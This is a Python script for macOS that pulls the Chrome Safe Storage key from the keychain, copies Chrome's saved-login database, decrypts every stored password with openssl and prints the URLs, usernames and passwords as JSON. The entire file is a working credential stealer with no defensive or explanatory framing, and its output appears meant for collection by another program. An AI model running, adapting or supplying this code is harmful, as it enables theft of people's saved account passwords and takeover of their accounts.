from fileinput import filename
import os
import base64
import sqlite3
import subprocess
import hashlib
import binascii
import sys
import json
import tempfile

def get_encryption_key():
    return subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).decode('utf-8').replace("\n", "").replace("\"", "")

def decrypt_password(password, key, iv):
    hexKey = binascii.hexlify(key).decode('utf-8')
    hexEncPassword = base64.b64encode(password[3:]).decode('utf-8')

    if len(hexEncPassword) == 0:
        return 'N/A'

    try: #send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True).decode('utf-8')
    except Exception as e:
        decrypted = 'N/A'

    return decrypted

def main():
    native_key = get_encryption_key().encode('utf-8')
    iv = ''.join(('20',) * 16)
    aes_key = hashlib.pbkdf2_hmac('sha1', native_key, b'saltysalt', 1003)[:16]
    
    db_path = os.path.expanduser('~/Library/') + "Application Support/Google/Chrome/Default/Login Data"

    with tempfile.NamedTemporaryFile() as tmp:
        with open(db_path, 'rb') as f:
            tmp.write(f.read())

        db = sqlite3.connect(tmp.name)
        cursor = db.cursor()

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
        entries = []

        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[2]
            password = decrypt_password(row[3], aes_key, iv)

            if password == 'N/A':
                continue

            entry = {}

            if username or password:
                entry['url'] = origin_url
                entry['username'] = username
                entry['password'] = password
                entries.append(entry)
            else:
                continue

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

        jsonDump = json.dumps(entries)
        print(jsonDump)
        sys.stdout.flush()


if __name__ == "__main__":
    main()
